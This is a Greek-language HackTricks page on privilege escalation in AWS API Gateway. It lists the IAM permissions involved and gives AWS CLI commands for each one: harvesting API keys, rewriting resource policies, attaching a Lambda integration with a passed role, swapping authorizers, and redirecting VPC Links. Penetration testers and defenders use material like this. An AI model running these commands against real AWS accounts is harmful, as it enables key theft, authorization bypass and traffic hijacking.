# AWS - Apigateway Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## Apigateway

Για περισσότερες πληροφορίες, δείτε:

{{#ref}}
../../aws-services/aws-api-gateway-enum.md
{{#endref}}

### `apigateway:POST`

Με αυτή την άδεια μπορείτε να δημιουργήσετε κλειδιά API για τα API που έχουν ρυθμιστεί (ανά περιοχή).
```bash
aws --region <region> apigateway create-api-key
```
**Potential Impact:** Δεν μπορείτε να privesc με αυτήν την τεχνική αλλά ενδέχεται να αποκτήσετε πρόσβαση σε ευαίσθητες πληροφορίες.

### `apigateway:GET`

Με αυτήν την άδεια μπορείτε να αποκτήσετε τα παραχθέντα API keys των APIs που έχουν ρυθμιστεί (per region).
```bash
aws --region <region> apigateway get-api-keys
aws --region <region> apigateway get-api-key --api-key <key> --include-value
```
**Potential Impact:** Δεν μπορείτε να privesc με αυτήν την τεχνική αλλά μπορεί να αποκτήσετε πρόσβαση σε ευαίσθητες πληροφορίες.

### `apigateway:UpdateRestApiPolicy`, `apigateway:PATCH`

Με αυτά τα permissions είναι δυνατόν να τροποποιήσετε το resource policy ενός API για να δώσετε στον εαυτό σας πρόσβαση να το καλέσετε και να καταχραστείτε τυχόν πρόσβαση που μπορεί να έχει το API gateway (όπως invoking a vulnerable lambda).
```bash
aws apigateway update-rest-api \
--rest-api-id api-id \
--patch-operations op=replace,path=/policy,value='"{\"jsonEscapedPolicyDocument\"}"'
```
**Potential Impact:** Συνήθως δεν θα μπορείτε να κάνετε privesc άμεσα με αυτήν την τεχνική, αλλά μπορεί να αποκτήσετε πρόσβαση σε ευαίσθητες πληροφορίες.

### `apigateway:PutIntegration`, `apigateway:CreateDeployment`, `iam:PassRole`

> [!NOTE]
> Απαιτείται δοκιμή

Ένας επιτιθέμενος με τα δικαιώματα `apigateway:PutIntegration`, `apigateway:CreateDeployment`, και `iam:PassRole` μπορεί να **προσθέσει μια νέα integration σε ένα υπάρχον API Gateway REST API με μια Lambda function που έχει επισυναπτόμενο IAM role**. Στη συνέχεια ο επιτιθέμενος μπορεί να **προκαλέσει τη Lambda function να εκτελέσει αυθαίρετο κώδικα και ενδεχομένως να αποκτήσει πρόσβαση στους πόρους που σχετίζονται με το IAM role**.
```bash
API_ID="your-api-id"
RESOURCE_ID="your-resource-id"
HTTP_METHOD="GET"
LAMBDA_FUNCTION_ARN="arn:aws:lambda:region:account-id:function:function-name"
LAMBDA_ROLE_ARN="arn:aws:iam::account-id:role/lambda-role"

# Add a new integration to the API Gateway REST API
aws apigateway put-integration --rest-api-id $API_ID --resource-id $RESOURCE_ID --http-method $HTTP_METHOD --type AWS_PROXY --integration-http-method POST --uri arn:aws:apigateway:region:lambda:path/2015-03-31/functions/$LAMBDA_FUNCTION_ARN/invocations --credentials $LAMBDA_ROLE_ARN

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**Potential Impact**: Πρόσβαση σε πόρους που σχετίζονται με το IAM role της Lambda function.

### `apigateway:UpdateAuthorizer`, `apigateway:CreateDeployment`

> [!NOTE]
> Χρειάζεται δοκιμή

Ένας επιτιθέμενος με τα δικαιώματα `apigateway:UpdateAuthorizer` και `apigateway:CreateDeployment` μπορεί να **τροποποιήσει έναν υπάρχοντα API Gateway authorizer** ώστε να παρακάμψει τους ελέγχους ασφαλείας ή να εκτελέσει αυθαίρετο κώδικα όταν γίνονται αιτήσεις API.
```bash
API_ID="your-api-id"
AUTHORIZER_ID="your-authorizer-id"
LAMBDA_FUNCTION_ARN="arn:aws:lambda:region:account-id:function:function-name"

# Update the API Gateway authorizer
aws apigateway update-authorizer --rest-api-id $API_ID --authorizer-id $AUTHORIZER_ID --authorizer-uri arn:aws:apigateway:region:lambda:path/2015-03-31/functions/$LAMBDA_FUNCTION_ARN/invocations

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**Πιθανός Αντίκτυπος**: Παράκαμψη ελέγχων ασφαλείας, μη εξουσιοδοτημένη πρόσβαση σε πόρους API.

### `apigateway:UpdateVpcLink`

> [!NOTE]
> Χρειάζεται δοκιμή

An attacker with the permission `apigateway:UpdateVpcLink` can **τροποποιήσει ένα υπάρχον VPC Link ώστε να δείχνει σε διαφορετικό Network Load Balancer, ενδεχομένως ανακατευθύνοντας την ιδιωτική κίνηση του API σε μη εξουσιοδοτημένους ή κακόβουλους πόρους**.
```bash
VPC_LINK_ID="your-vpc-link-id"
NEW_NLB_ARN="arn:aws:elasticloadbalancing:region:account-id:loadbalancer/net/new-load-balancer-name/50dc6c495c0c9188"

# Update the VPC Link
aws apigateway update-vpc-link --vpc-link-id $VPC_LINK_ID --patch-operations op=replace,path=/targetArns,value="[$NEW_NLB_ARN]"
```
**Πιθανός Αντίκτυπος**: Μη εξουσιοδοτημένη πρόσβαση σε ιδιωτικούς πόρους API, παρεμβολή ή διακοπή της κυκλοφορίας API.

{{#include ../../../../banners/hacktricks-training.md}}
